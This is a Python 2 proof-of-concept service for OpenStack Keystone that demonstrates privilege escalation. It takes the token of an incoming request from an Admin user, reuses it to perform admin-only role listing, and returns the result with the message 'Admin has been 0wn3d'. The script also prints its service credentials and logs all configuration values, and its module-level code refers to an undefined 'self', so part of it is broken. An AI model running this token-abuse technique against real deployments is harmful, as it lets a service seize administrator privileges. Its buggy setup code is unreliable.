#!/usr/bin/env python

from keystoneauth1 import loading
from keystoneauth1 import session
import keystoneauth1.identity
from keystoneclient import client as ks_client
from keystonemiddleware import auth_token
from oslo_config import cfg
from wsgiref import simple_server
import json
import logging
import os
import sys
import webob.dec

CONF = cfg.CONF
CONF(project='privs_escalation')
loading.session.register_conf_options(cfg.CONF, 'communication')
vars = filter(lambda x: x[0].startswith('OS_'), os.environ.iteritems())
conf_keys = CONF.keys()
for k, v in vars:
    # Try the full var first
    n = k.lower()
    cands = (n, n[3:])
    for var in cands:
        if var in conf_keys:
            self.conf.set_default(name=var, default=v)
            break

CONF(sys.argv[1:])
GROUP = 'service_auth'

loading.conf.register_conf_options(CONF, GROUP)
# MUST use 'auth_section'
try:
    auth = loading.conf.load_from_conf_options(CONF, GROUP)
except AttributeError, e:
    sys.exit('Configuration error: %s' % e)
except Exception, e:
    sys.exit('Unhandled exception: %s - %s' % (type(e), e.message))

# Initial session is for service user
SESSION = session.Session(auth=auth)
ADMIN_ROLE_NAME = u'Admin'

def req_info(req):
    auth = req.environ['keystone.token_auth']
    token_info = req.environ['keystone.token_info']
    # NB(kamidzi): cannot use auth._session as auth._session.auth,
    # required by Discovery, is None
    ks = ks_client.Client('3', session=SESSION, auth=auth)
    user_id = ks.auth.client.get_user_id()
    ret = {'auth': auth.user._data, 'token_info': token_info}
    if ADMIN_ROLE_NAME in auth.user.role_names:
        # exec some known admin op
        admin_data = [r.name for r in ks.roles.list()]
        admin_ret = {
            'message': 'Admin has been 0wn3d',
            'privileged_data': {
                'perms': 'identity:list_roles',
                'data': {
                    'role_names': admin_data,
                },
            }
        }
        ret.update(admin_ret)
    return ret


@webob.dec.wsgify
def app(req):
    resp = req_info(req)
    return webob.Response(json.dumps(resp))


def render_auth(auth):
    if isinstance(auth, keystoneauth1.identity.generic.password.Password):
        ret = {
            'project': auth._project_name,
            'username': auth._username,
        }
        return ret


PORT = 5150
if __name__ == '__main__':
    logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
    logger = logging.getLogger(cfg.CONF.project)

    app = auth_token.AuthProtocol(app, {})
    # See https://github.com/openstack/keystonemiddleware/blob/4.14.0/keystonemiddleware/auth_token/__init__.py#L663
    print('App credentials: %s' % render_auth(app._auth))
    app._conf.oslo_conf_obj.log_opt_values(logger, logging.DEBUG)
    server = simple_server.make_server('', PORT, app)
    server.serve_forever()
